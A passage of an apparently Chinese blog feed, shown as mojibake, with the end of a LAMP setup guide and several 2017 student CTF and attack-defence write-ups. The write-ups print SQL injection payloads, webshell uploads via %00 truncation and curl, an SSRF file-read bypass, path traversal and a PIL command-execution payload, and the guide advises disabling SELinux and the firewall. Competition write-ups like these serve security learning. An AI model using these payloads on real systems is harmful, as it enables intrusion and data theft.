<p>å¹¶å°†ç½‘ç«™æ–‡ä»¶æ”¾å…¥<code>/work/WEBROOT/default/</code><br> è¯·ç¡®ä¿webç›®å½•æ‰€å±ç”¨æˆ·å’Œæ‰€å±ç”¨æˆ·ç»„ä¸º<code>apache</code>,å¯ç”¨<code>chown</code>ä¸<code>chgrp</code>å‘½ä»¤æ›´æ”¹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">chown apache /work -R</div><div class="line">chgrp apache /work -R</div></pre></td></tr></table></figure></p>
<p>æœåŠ¡å¯åŠ¨å‰ï¼Œè¯·ç¡®ä¿é˜²ç«å¢™å¯¹apacheä¸ºå¼€æ”¾æƒé™ï¼Œè‹¥ä¸æƒ³é…ç½®é˜²ç«å¢™ç­–ç•¥ï¼Œ<br>è¯·å…³é—­selinux ä¸firewalld.service<br>åˆ†åˆ«ä¸º<br>ä¿®æ”¹<code>/etc/selinux/config</code>æ–‡ä»¶ä¸­è®¾ç½®<code>SELINUX=disabled</code> ï¼Œç„¶åé‡å¯æœåŠ¡å™¨ã€‚<br>å’Œ<code>systemctl disable firewalld</code><br>æ‰§è¡Œåè¯·é‡å¯æœåŠ¡å™¨</p>
<p>å¯åŠ¨æœåŠ¡<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl start httpd.service</div></pre></td></tr></table></figure></p>
<p>åŠ å…¥å¼€æœºå¯åŠ¨<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl enable httpd.service</div></pre></td></tr></table></figure></p>
<h1 id="Mysqlé…ç½®"><a href="#Mysqlé…ç½®" class="headerlink" title="Mysqlé…ç½®"></a>Mysqlé…ç½®</h1><p>å…ˆå®‰è£…å¸¦æœ‰å¯ç”¨çš„mysql5ç³»åˆ—ç¤¾åŒºç‰ˆèµ„æºçš„rpmåŒ…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rpm -Uvh http://dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm</div></pre></td></tr></table></figure></p>
<p>æŸ¥çœ‹å½“å‰å¯ç”¨çš„mysqlå®‰è£…èµ„æº<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum repolist enabled | grep &quot;mysql.*-community.*&quot;</div></pre></td></tr></table></figure></p>
<p>ç›´æ¥ä½¿ç”¨yumçš„æ–¹å¼å®‰è£…MySQL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum -y install mysql-community-server     #è¿™ä¸€æ­¥å¾ˆæ…¢</div></pre></td></tr></table></figure></p>
<p>åŠ å…¥å¼€æœºå¯åŠ¨<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl enable mysqld</div></pre></td></tr></table></figure></p>
<p>å¯åŠ¨æœåŠ¡<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl start mysqld</div></pre></td></tr></table></figure></p>
<p>åˆå§‹åŒ–ï¼ˆé‡ç½®å¯†ç ï¼Œåˆ é™¤åŒ¿åç”¨æˆ·ï¼Œè¿œç¨‹ç™»å½•é…ç½®ç­‰ï¼‰<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql_secure_installation</div></pre></td></tr></table></figure></p>
<p>ç™»å½•æ•°æ®åº“<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql -uroot -p</div></pre></td></tr></table></figure></p>
<p>é€‰æ‹©æ•°æ®åº“<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">use databaseï¼›</div></pre></td></tr></table></figure></p>
<p>å¯¼å…¥sql<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">source /work/xxx.sql</div></pre></td></tr></table></figure></p>
<h1 id="é…ç½®ç½‘ç«™æ•°æ®åº“ä¿¡æ¯"><a href="#é…ç½®ç½‘ç«™æ•°æ®åº“ä¿¡æ¯" class="headerlink" title="é…ç½®ç½‘ç«™æ•°æ®åº“ä¿¡æ¯"></a>é…ç½®ç½‘ç«™æ•°æ®åº“ä¿¡æ¯</h1><p>æ ¹æ®è¦æ­å»ºçš„ç½‘ç«™æ¥é…ç½®</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å¾ˆä¹…ä¹‹å‰å¸®è€å¸ˆå†™çš„LAMPï¼ˆlinux+apache+mysql+phpï¼‰æ•™ç¨‹ï¼Œè‡ªå·±ä¹Ÿç”¨è¿™ä¸ªæ–¹æ³•é…äº†å¥½å¤šå°æœåŠ¡å™¨ï¼Œå‘åˆ°åšå®¢è®°å½•ä¸€ä¸‹ï¼Œä¹Ÿå¸Œæœ›èƒ½ç»™å¤§å®¶å¸¦æ¥ä¸€äº›å¸®åŠ©ã€‚&lt;br&gt;
    
    </summary>
    
    
      <category term="è¿ç»´" scheme="https://www.codemonster.cn/tags/%E8%BF%90%E7%BB%B4/"/>
    
      <category term="LAMP" scheme="https://www.codemonster.cn/tags/LAMP/"/>
    
  </entry>
  
  <entry>
    <title>2017 ç¬¬ä¸‰å±Šç¦å»ºçœé«˜æ ¡ç½‘ç»œç©ºé—´å®‰å…¨å¤§èµ› WriteUp</title>
    <link href="https://www.codemonster.cn/2017/10/31/2017-3th-fjwlkjaqds-writeup/"/>
    <id>https://www.codemonster.cn/2017/10/31/2017-3th-fjwlkjaqds-writeup/</id>
    <published>2017-10-31T14:15:27.000Z</published>
    <updated>2018-05-04T07:47:50.009Z</updated>
    
    <content type="html"><![CDATA[<p>10æœˆ27å‚åŠ çš„çœèµ›ï¼Œä»Šå¹´éš¾åº¦è¾ƒä¹‹å»å¹´æé«˜äº†ä¸å°‘ï¼Œæœ€ç»ˆæ‹¿åˆ°äº†ä¸€ç­‰å¥–ï¼Œç®—æ˜¯æ¯”è¾ƒæ»¡æ„äº†ï¼Œä½†æ˜¯AWDåœºæ‰“çš„è¿˜æ˜¯ä¸å¤Ÿå¥½ï¼Œè¿˜éœ€è¦ä¸æ–­å­¦ä¹ ï¼ŒWriteUpå¦‚ä¸‹ï¼ˆåç»­ä¼šè¡¥ä¸Šèµ›ååšå‡ºçš„é¢˜ï¼‰ï¼š<br><a id="more"></a></p>
<h1 id="ä¸ŠåˆCTFåœº"><a href="#ä¸ŠåˆCTFåœº" class="headerlink" title="ä¸ŠåˆCTFåœº"></a>ä¸ŠåˆCTFåœº</h1><h2 id="è¦æƒ³ä¼šï¼Œå…ˆå­¦ä¼š"><a href="#è¦æƒ³ä¼šï¼Œå…ˆå­¦ä¼š" class="headerlink" title="è¦æƒ³ä¼šï¼Œå…ˆå­¦ä¼š"></a>è¦æƒ³ä¼šï¼Œå…ˆå­¦ä¼š</h2><p>å®˜æ–¹æç¤º<code>ping</code>ï¼Œåœ¨æµé‡åŒ…æ–‡ä»¶ä¸­æ‰¾<code>icmpåè®®</code>ï¼Œ<br><img src="/img/2017byb1.png" alt=""><br>æŒ‰ç…§æ—¶é—´æ’åºï¼Œå¾—åˆ°ä¸€ä¸²å¥‡æ€ªçš„ä¸œè¥¿ï¼Œè½¬asciiæœ‰å¾ˆå¤šå­—ç¬¦ä¸å¯è§ï¼ŒçŒœæµ‹æ˜¯æœ‰ä¸€äº›åç§»ï¼Œäºæ˜¯å†™äº†ä¸ªpyè„šæœ¬æš´åŠ›æ‰€ä»¥å¯èƒ½çš„åç§»ï¼Œå¾—åˆ°flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line">a=[<span class="number">144</span>,<span class="number">150</span>,<span class="number">150</span>,<span class="number">139</span>,<span class="number">145</span>,<span class="number">165</span>,<span class="number">120</span>,<span class="number">139</span>,<span class="number">91</span>,<span class="number">160</span>,<span class="number">93</span>,<span class="number">167</span>,<span class="number">70</span>]</div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">-50</span>,<span class="number">50</span>):</div><div class="line">  flag=<span class="string">''</span></div><div class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> a:</div><div class="line">    flag+=chr(i+j)</div><div class="line">  <span class="keyword">print</span> flag</div></pre></td></tr></table></figure></p>
<p><img src="/img/2017byb2.png" alt=""></p>
<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>ä¸Šä¼ é¢˜ï¼Œé™åˆ¶äº†åç¼€ï¼ŒburpæŠ“åŒ…ï¼Œ<code>%00æˆªæ–­</code>ä¸Šä¼ ç½‘é©¬ï¼Œèœåˆ€è¿æ¥ï¼Œåœ¨configé‡Œæ‰¾åˆ°æ•°æ®åº“é…ç½®ï¼Œåœ¨æ•°æ®åº“ä¸­æ‰¾åˆ°flagï¼Œæ‰‹å¿«ä¸€è¡€</p>
<h2 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h2><p>Fuzzçš„æ—¶å€™å‘ç°%25ä¼šæŠ¥é”™<code>sprintf</code>ï¼Œå°±çŒœæµ‹æ˜¯æ ¼å¼åŒ–æ¼æ´ï¼Œä½†æ˜¯æ²¡æœ‰ç½‘æŸ¥èµ„æ–™ï¼Œåæ¥å®˜æ–¹çš„æç¤ºç«Ÿç„¶ç›´æ¥ç»™äº†payloadï¼š<br>ä½¿ç”¨äº†ä¸¤æ¬¡sprintfå¯¼è‡´æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆå¯æ„é€ <code>admin%1$&#39; and 1=1#</code>ä¸<code>admin%1$&#39; and 1=2#</code>ï¼‰ï¼Œsqlç›²æ³¨ï¼Œflagåœ¨flagè¡¨flagåˆ—ï¼Œflagçš„å­—ç¬¦é›†ä¸º0123456789abcdeflg{}-<br>è„šæœ¬æ’¸å‡ºæ¥å•çº¿ç¨‹å¤ªæ…¢ï¼Œäºæ˜¯ç”¨burpsuiteä¸€ä¸ªä¸€ä¸ªå­—ç¬¦çˆ†ç ´çš„<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">admin%1$&apos; and (ascii(mid((select flag from flag limit 1),&#123;0&#125;,1))=&#123;1&#125;)#</div></pre></td></tr></table></figure></p>
<h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><p>ç»™äº†ä¸¤ä¸ªé¶æœºï¼Œä¸€ä¸ªwebï¼Œä¸€ä¸ªpwnï¼Œåˆ°æœ€åpwnä¹Ÿæ²¡äººåšå‡ºæ¥<br>Webå¤§è‡´æœ‰ä¸¤ä¸ªåˆ©ç”¨æ–¹å‘ï¼Œä¸€ä¸ªæ˜¯commonç›®å½•ä¸‹çš„home.phpå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$a=@$_POST[<span class="string">'a'</span>];</div><div class="line">@unserialize($a);</div></pre></td></tr></table></figure></p>
<p>å› ä¸ºå¯¹è¿™å—ä¸ç†Ÿæ‰€ä»¥æ²¡åˆ©ç”¨æˆåŠŸï¼Œåˆç¿»å•Šç¿»ï¼Œåœ¨lib/User.php é‡Œå‘ç°äº†ä¸Šä¼ éƒ¨åˆ†çš„é€»è¾‘<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]) <span class="keyword">and</span> $_SESSION[<span class="string">'username'</span>]===<span class="string">"admin"</span>)&#123;</div><div class="line">        <span class="keyword">include_once</span> <span class="keyword">__DIR__</span>.<span class="string">"/File.php"</span>;</div><div class="line">        $up=<span class="keyword">new</span> File();</div><div class="line">        <span class="keyword">if</span>($up-&gt;save())&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;tp-&gt;display(<span class="string">"success.tpl"</span>);</div><div class="line">        &#125;       </div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;tp-&gt;display(<span class="string">"error.tpl"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span><span class="params">()</span></span>&#123;</div><div class="line">    $_SESSION=<span class="keyword">array</span>();</div><div class="line">    session_destroy();</div><div class="line">    header(<span class="string">"location: ./index.php"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">updatepass</span><span class="params">()</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST[<span class="string">'username'</span>]) <span class="keyword">and</span> !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>]))&#123;</div><div class="line">        $username=addslashes($_POST[<span class="string">'username'</span>]);</div><div class="line">        $password=md5($_POST[<span class="string">'password'</span>]);</div><div class="line">        $sql=<span class="string">"update user set password='$password' where username='$username' "</span>;</div><div class="line">        <span class="keyword">if</span> (mysql_query($sql))&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;tp-&gt;display(<span class="string">"success.tpl"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>é‡ç‚¹åœ¨<code>uploadå‡½æ•°</code>å’Œ<code>updatepasså‡½æ•°</code>ï¼Œuploadé™åˆ¶äº†åªæœ‰<code>admin</code>è´¦å·æ‰èƒ½ä¸Šä¼ æ–‡ä»¶ï¼Œè€Œupdatepasså¯ä»¥<code>ä¿®æ”¹ä»»æ„ç”¨æˆ·å¯†ç </code>ï¼Œè¿™é‡Œå°±æœ‰äº†æ€è·¯</p>
<ol>
<li>é€šè¿‡updatepasså‡½æ•°<code>ä¿®æ”¹adminå¯†ç </code></li>
<li>ç™»å½•adminè´¦å·<code>ä¸Šä¼ shell</code>ï¼ˆshellçš„åç¼€è¦å¤§å°å†™ç»•è¿‡é»‘åå•é™åˆ¶ï¼‰</li>
<li>é€šè¿‡shell<code>è¯»å–flagå¹¶æäº¤</code></li>
</ol>
<p>æ€è·¯å¾ˆæ¸…æ™°ï¼Œç„¶è€Œè„šæœ¬æ˜¯ä¸ªå¤§é—®é¢˜ï¼Œç™»å½•ä¸Šä¼ å¼„å¾—æ‰‹å¿™è„šä¹±ï¼Œå‰æœŸå¾ˆé•¿ä¸€æ®µæ—¶é—´å…¨é é˜Ÿå‹æ‰‹åŠ¨ä¼ shellï¼Œæäº¤flagï¼Œè„šæœ¬æ†‹å‡ºæ¥åå¤§éƒ¨åˆ†äººéƒ½ä¿®å¤æ¼æ´äº†ï¼Œå°±å¾ˆéš¾å—ï¼Œæœ€ååŸºæœ¬æ˜¯æ‰“npcå’Œå…¶ä»–å‡ ä¸ªé˜Ÿï¼Œéœ€è¦å¥½å¥½åæ€ï¼Œæƒé™ç»´æŒè¿™ä¸€å—æ²¡å¼„ï¼Œå°±åœ¨ä¸€å°ç”µè„‘è¯•éªŒäº†ä¸€ä¸‹ï¼Œå‡†å¤‡å¥½çš„ä»£ç æäº¤æ¡†æ¶ä¹Ÿæ²¡ç”¨ä¸Šï¼Œæ€»ä¹‹AWDè¿˜æ˜¯å¾ˆåˆºæ¿€çš„ï¼Œæœ€ç»ˆçš„æˆç»©ä¹Ÿæ»¡ç†æƒ³ï¼Œå°±æ˜¯ä¸€ç­‰çš„å¥–é‡‘ç¼©æ°´äº†æœ‰ç‚¹æ‰å¿ƒã€‚</p>
<p>æ¯”èµ›ç•Œé¢å¦‚ä¸‹<br><img src="/img/2017byb3.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;10æœˆ27å‚åŠ çš„çœèµ›ï¼Œä»Šå¹´éš¾åº¦è¾ƒä¹‹å»å¹´æé«˜äº†ä¸å°‘ï¼Œæœ€ç»ˆæ‹¿åˆ°äº†ä¸€ç­‰å¥–ï¼Œç®—æ˜¯æ¯”è¾ƒæ»¡æ„äº†ï¼Œä½†æ˜¯AWDåœºæ‰“çš„è¿˜æ˜¯ä¸å¤Ÿå¥½ï¼Œè¿˜éœ€è¦ä¸æ–­å­¦ä¹ ï¼ŒWriteUpå¦‚ä¸‹ï¼ˆåç»­ä¼šè¡¥ä¸Šèµ›ååšå‡ºçš„é¢˜ï¼‰ï¼š&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="AWD" scheme="https://www.codemonster.cn/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>2017 å…¨å›½å¤§å­¦ç”Ÿè½¯ä»¶æµ‹è¯•å¤§èµ›webå®‰å…¨èµ›åˆ†åŒºå†³èµ› WriteUp</title>
    <link href="https://www.codemonster.cn/2017/10/24/2017-mooctest-second-writeup/"/>
    <id>https://www.codemonster.cn/2017/10/24/2017-mooctest-second-writeup/</id>
    <published>2017-10-24T05:40:13.000Z</published>
    <updated>2018-07-28T06:19:37.052Z</updated>
    
    <content type="html"><![CDATA[<p>å‘¨æœ«å»å¹¿å·æ°´äº†ä¸€æ³¢ï¼Œæ¯”èµ›çš„æ—¶å€™åšå‡ºæ¥7é“é¢˜ï¼Œèµ›åè¡¥ä¸Š2ã€3ä¸¤é¢˜ï¼Œä¸‹é¢æ˜¯å‰9é¢˜çš„WriteUpï¼ŒæœŸå¾…å¤§ä½¬çš„ç¬¬10é¢˜WriteUp<br><a id="more"></a></p>
<h2 id="1-host"><a href="#1-host" class="headerlink" title="1.host"></a>1.host</h2><p>åœ¨burpsuiteä¸­ä¿®æ”¹hostä¸º<code>www.mooctest.net</code><br><img src="/img/2017-mooctest-sec-1.png" alt=""></p>
<h2 id="2-Babyupload"><a href="#2-Babyupload" class="headerlink" title="2.Babyupload"></a>2.Babyupload</h2><p>æ‰«æå¾—åˆ°upload.phpï¼Œæœ¬åœ°æ„é€ upload.html<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;form action=<span class="string">"http://114.55.36.69:46012/upload.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</div><div class="line">    &lt;label <span class="keyword">for</span>=<span class="string">"upfile"</span>&gt;æ–‡ä»¶åï¼š&lt;/label&gt;</div><div class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"upfile"</span> id=<span class="string">"file"</span>&gt;&lt;br&gt;</div><div class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"æäº¤"</span>&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>æ¯”èµ›çš„æ—¶å€™æ­»æ´»çŒœä¸å‡ºæ–‡ä»¶å‚æ•°åï¼Œfileã€uploadã€uploadfileéƒ½è¯•è¿‡ï¼Œèµ›åç»å¤§ä½¬æé†’æ‰çŸ¥é“æ˜¯<code>upfile</code><br>ä¹Ÿå¯ä»¥ç›´æ¥ç”¨curlä¸Šä¼ æ–‡ä»¶ï¼Œå­¦åˆ°äº†<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl http://114.55.36.69:46012/upload.php -F &quot;upfile=@x.php&quot;</div></pre></td></tr></table></figure></p>
<p>ä¸Šä¼ åèœåˆ€è¿æ¥ï¼ŒæŸ¥çœ‹webç›®å½•ä¸‹çš„flag.phpæ‹¿åˆ°flag<br><img src="/img/2017-mooctest-sec-2.png" alt=""></p>
<h2 id="3-curl"><a href="#3-curl" class="headerlink" title="3.curl"></a>3.curl</h2><p>è¿‡æ»¤äº†<code>file:</code>åé¢çš„<code>/</code>ï¼ŒæŠŠ<code>/</code>è½¬æˆ<code>0x2f</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://114.55.36.69:46013/index.php?url=file:0x2f0x2f/var/www/html/index.php</div></pre></td></tr></table></figure></p>
<p><img src="/img/2017-mooctest-sec-3.png" alt=""></p>
<h2 id="4-war"><a href="#4-war" class="headerlink" title="4.war"></a>4.war</h2><p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œä¸‹è½½trick-or-treat.war<br><img src="/img/2017-mooctest-sec-4.png" alt=""></p>
<h2 id="5-readme2"><a href="#5-readme2" class="headerlink" title="5.readme2"></a>5.readme2</h2><p>åœ¨jsæ–‡ä»¶é‡Œå‘ç°<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://114.55.36.69:46015/test/show.do?page=help.jsp</div></pre></td></tr></table></figure></p>
<p>çŒœæµ‹æ˜¯ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¯»å–javawebå·¥ç¨‹çš„<code>WEB-INF/web.xml</code>æ–‡ä»¶<br><img src="/img/2017-mooctest-sec-5.png" alt=""><br>æ¥ç€è¯»å–<code>WEB-INF/properties/configInfo.properties</code><br><img src="/img/2017-mooctest-sec-6.png" alt=""><br>å‘ç°<code>key.jsp</code>ï¼Œè¯»å–<code>key.jsp</code><br><img src="/img/2017-mooctest-sec-7.png" alt=""></p>
<h2 id="6-source-ip"><a href="#6-source-ip" class="headerlink" title="6.source ip"></a>6.source ip</h2><p>å»fofaæœæ ‡é¢˜ï¼Œè¯•äº†ä¸‰å››ä¸ªå°±è¯•å‡ºæ¥äº†ï¼Œå¬è¯´è¿˜æœ‰å‘é‚®ä»¶å§¿åŠ¿æ›´ä¼˜é›…<br><img src="/img/2017-mooctest-sec-8.png" alt=""></p>
<h2 id="7-hackedsite"><a href="#7-hackedsite" class="headerlink" title="7.hackedsite"></a>7.hackedsite</h2><p>æ‰«æå¾—åˆ°<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://118.178.18.181:46017/upload/phpspy.php</div></pre></td></tr></table></figure></p>
<p>ç™¾åº¦æœç´¢phpspyå¾—åˆ°å¯†ç <code>angle</code>ï¼Œè¿æ¥å¤§é©¬æ‹¿åˆ°flag<br><img src="/img/2017-mooctest-sec-9.png" alt=""></p>
<h2 id="8-babysql3"><a href="#8-babysql3" class="headerlink" title="8.babysql3"></a>8.babysql3</h2><p>nameå­—æ®µå­˜åœ¨æ³¨å…¥ï¼Œæ„é€ <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">keyname=1&amp;name=name` union select 1,2,flag from flag %23</div></pre></td></tr></table></figure></p>
<p><img src="/img/2017-mooctest-sec-10.png" alt=""></p>
<h2 id="9-snake"><a href="#9-snake" class="headerlink" title="9.snake"></a>9.snake</h2><p>æç¤ºäº†<code>PIL-RCE</code><br>å‚è€ƒ<a href="https://github.com/neargle/PIL-RCE-By-GhostButt/blob/master/Exploiting-Python-PIL-Module-Command-Execution-Vulnerability.md" target="_blank" rel="noopener">https://github.com/neargle/PIL-RCE-By-GhostButt/blob/master/Exploiting-Python-PIL-Module-Command-Execution-Vulnerability.md</a><br>æ„é€ pocæ–‡ä»¶ä¸­çš„ä»£ç ä¸º<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(%pipe%cat /var/www/Flask/flag &gt; tmp/fffffff.png)</div></pre></td></tr></table></figure></p>
<p>ä¸Šä¼ å¾—åˆ°flag<br><img src="/img/2017-mooctest-sec-11.png" alt=""></p>
<h2 id="10-thinkphp5"><a href="#10-thinkphp5" class="headerlink" title="10.thinkphp5"></a>10.thinkphp5</h2><p>æ— </p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å‘¨æœ«å»å¹¿å·æ°´äº†ä¸€æ³¢ï¼Œæ¯”èµ›çš„æ—¶å€™åšå‡ºæ¥7é“é¢˜ï¼Œèµ›åè¡¥ä¸Š2ã€3ä¸¤é¢˜ï¼Œä¸‹é¢æ˜¯å‰9é¢˜çš„WriteUpï¼ŒæœŸå¾…å¤§ä½¬çš„ç¬¬10é¢˜WriteUp&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>2017 å…¨å›½å¤§å­¦ç”Ÿè½¯ä»¶æµ‹è¯•å¤§èµ›webå®‰å…¨èµ›é¢„èµ› WriteUp</title>
    <link href="https://www.codemonster.cn/2017/10/23/2017-mooctest-first-writeup/"/>
    <id>https://www.codemonster.cn/2017/10/23/2017-mooctest-first-writeup/</id>
    <published>2017-10-23T12:20:13.000Z</published>
    <updated>2018-05-04T07:47:50.012Z</updated>
    
    <content type="html"><![CDATA[<p>å…¶å®å°±æ˜¯æ…•æµ‹å®‰æ’æ¯<br>6æœˆ18æ—¥çš„å¤å­£é¢„èµ›çº¿ä¸Šèµ›ï¼Œ9æœˆ22æ—¥æ›´æ–°babysqlï¼Œ10æœˆ12æ—¥æ›´æ–°findpwdã€æœåŠ¡å‘ç°ã€babylogin<br>10æœˆ23æ›´æ–°ç§‹å­£é¢„èµ›é¢˜ç›®<br><a id="more"></a></p>
<h1 id="å¤å­£é¢„èµ›"><a href="#å¤å­£é¢„èµ›" class="headerlink" title="å¤å­£é¢„èµ›"></a>å¤å­£é¢„èµ›</h1><h2 id="æ ¹æ®ipæŸ¥dnsè§£æè®°å½•"><a href="#æ ¹æ®ipæŸ¥dnsè§£æè®°å½•" class="headerlink" title="æ ¹æ®ipæŸ¥dnsè§£æè®°å½•"></a>æ ¹æ®ipæŸ¥dnsè§£æè®°å½•</h2><p>é¢˜ç›®åŸæ„æ˜¯è®©æˆ‘ä»¬ç”¨cmdçš„nslookupå‘½ä»¤ï¼Œæˆ‘ç›´æ¥ä¸ŠdnsåæŸ¥ç½‘ç«™æŸ¥çš„</p>
<p>åˆ°è¿™ä¸ªç½‘ç«™æŸ¥dnsè§£æ<a href="https://www.boip.net/ipv4/" target="_blank" rel="noopener">https://www.boip.net/ipv4/</a></p>
<p>flagä¸º<code>this-is-flag</code></p>
<h2 id="ç¼–è¾‘å™¨æ³„éœ²"><a href="#ç¼–è¾‘å™¨æ³„éœ²" class="headerlink" title="ç¼–è¾‘å™¨æ³„éœ²"></a>ç¼–è¾‘å™¨æ³„éœ²</h2><p>é¢˜ç›®æç¤ºç¼–è¾‘å™¨æ³„éœ²,fuzzåä¸‹è½½åˆ°äº†<code>login.php.swp</code>ï¼Œç”¨<code>vim -r login.php.swp</code>æ¢å¤å¾—åˆ°æºç ï¼Œçœ‹åˆ°æ˜æ–‡è´¦å·å¯†ç ï¼Œ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ($userin==<span class="string">"admin94wo"</span>)</div><div class="line"><span class="keyword">if</span>($passin==<span class="string">"ca1buda0mima7ah4ha"</span>)</div></pre></td></tr></table></figure></p>
<p>ç”¨è´¦å·å¯†ç ç™»å½•login.phpå¾—åˆ°flagï¼Œ<code>flag{b4ckup_1s_normal}</code></p>
<h2 id="babywaf"><a href="#babywaf" class="headerlink" title="babywaf"></a>babywaf</h2><p>fuzzåå‘ç° &lt; è¢«è¿‡æ»¤äº†ï¼Œæ„é€ post file=.&lt;./.&lt;./.&lt;./.&lt;./.&lt;./flag æäº¤å¾—åˆ°flagï¼Œ<code>flag{To0_young_2_simple!}</code></p>
